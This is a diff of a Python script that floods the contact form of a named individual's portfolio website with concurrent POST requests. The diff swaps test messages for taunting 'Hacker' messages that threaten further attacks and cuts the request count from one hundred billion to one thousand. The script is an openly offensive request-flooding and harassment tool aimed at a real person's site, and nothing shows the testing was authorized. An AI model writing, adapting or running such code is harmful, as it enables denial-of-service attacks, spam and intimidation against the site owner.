@@ -18,9 +18,9 @@ def send_contact():
         "referer": "https://bensidneyndunguportfolio.vercel.app/",
     }
     payload = {
-        "name": "User 199",
-        "email": "test199@gmail.com",
-        "message": "Test message for testing, is this site secure mr bensidney!!!!!! 199",
+        "name": "Hacker 199",
+        "email": "Hacker199@gmail.com",
+        "message": "I have decided to attack your site bro, Make sure it is fully secure coz i will attack again!!!!!",
     }
 
     response = requests.post(url, headers=headers, json=payload, timeout=15)
@@ -46,8 +46,8 @@ def concurrent_requests_in_chunks(total_requests, chunk_size):
 
 
 # Adjust the values of the following variables as needed
-total_requests = 100000000000  # Maximum number of requests
-chunk_size = 10000  # Number of requests in each chunk
+total_requests = 1000  # Maximum number of requests
+chunk_size = 10  # Number of requests in each chunk
 
 
 concurrent_requests_in_chunks(total_requests, chunk_size)
